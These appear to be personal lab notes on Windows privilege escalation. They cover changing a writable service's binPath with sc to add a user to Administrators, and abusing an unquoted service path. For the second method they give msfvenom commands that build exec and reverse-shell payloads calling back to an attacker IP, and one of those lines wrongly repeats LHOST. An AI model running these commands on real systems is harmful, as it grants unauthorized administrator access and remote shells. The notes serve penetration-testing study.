### binPath
First run powerup to check if we have any write access to any path
![[Pasted image 20210719165835.png]]

As we can see we have **daclsvc** service on which we have write permission

We can also check this with **accesschk** . Use the following command to check for service permission
```powershell
accesschk64.exe -uwcv Everyone *
```

| Commands | Use |  
| ----------- | ----------- |  
| -w | File which have write access  |  
| -v | Verbose Output |
| -u | Ignore the errors |
| -c | Display the service name |

**Everyone** is the group that will have access to services
![[Pasted image 20210719170412.png]]

We can see the same output here also the daclsvc service can be access by everyone

The ability to **SERVICE_CHANGE_CONFIG** will allow changes to the configuration of the service

To get more information on **daclsvc** we can use **accesschk**
```powershell
accesschk64.exe -uwcv daclsvc
```

![[Pasted image 20210719170717.png]]

This will show more information about that service

To query the service type
```powershell
sc qc daclsvc
```
![[Pasted image 20210719170910.png]]

Notice the Binary Path as we have access to change its configuration we will change its path. To change the path use the following command
```powershell
sc config daclsvc binpath= "net localgroup administrators user /add"
```

Here we are changing the path to add our user to the administrator group

Querying the service again we can see that the path is changed
![[Pasted image 20210719171310.png]]

To start the service type
```powershell
sc start daclsvc
```

**Note**: Error might occur because we remove the application and replaced it with the custom path

After starting the service the user will be added to the local group

### Unquoted Service Paths
The unquoted service paths are those where there are no quotes included in the path and there are spaces between the paths. With this misconfiguration we can trick the service to run our executable when the path is checked

First run powerup to see the unquoted service paths
![[Pasted image 20210719172716.png]]
![[Pasted image 20210719172743.png]]

In the following output you can see the path is unquoted and we can use this to get a shell
The service is called **unquotedsvc**

To generate a meterpreter shell use the following command
```bash
# This will add the user to the local group
msfvenom -p windows/exec CMD='net localgroup administrators user /add' -f exe-service -o common.exe

# This will give a reverse shell
msfvenom -p windows/meterpreter/reverse_tcp LHOST=[Kali VM IP Address] LHOST=[Port Number] -f exe -o common.exe

# Netcat Shell
msfvenom -p windows/shell_reverse_tcp LHOST=[Kali VM IP Address] LPORT=[Port Number] -f exe -o common.exe
```

Place the generated payload in between the path in our case **Common Files** so we named it **common.exe**

Start the service
```powershell
sc start unquotedsvc
```

You will have a shell
